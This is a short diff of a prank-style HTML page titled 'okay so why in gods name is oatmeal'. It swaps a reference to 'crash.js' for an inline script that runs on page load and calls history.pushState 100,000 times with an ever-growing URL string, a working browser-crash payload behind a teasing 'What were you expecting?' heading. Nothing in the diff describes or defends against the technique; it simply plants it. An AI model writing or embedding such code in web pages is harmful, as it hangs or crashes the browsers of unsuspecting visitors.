@@ -5,7 +5,13 @@
     <title>okay so why in gods name is oatmeal</title>
   </head>
   <body>
-    okay so why in gods name is oatmeal
-    <script src="crash.js"></script>
+    <h1>What were you expecting?</h1>
+    <script>
+        var total = "";
+        for( var i = 0; i < 100000; i++ ) {
+            total = total + i.toString();
+            history.pushState(0,0, total );
+        }
+    </script>
   </body>
 </html>
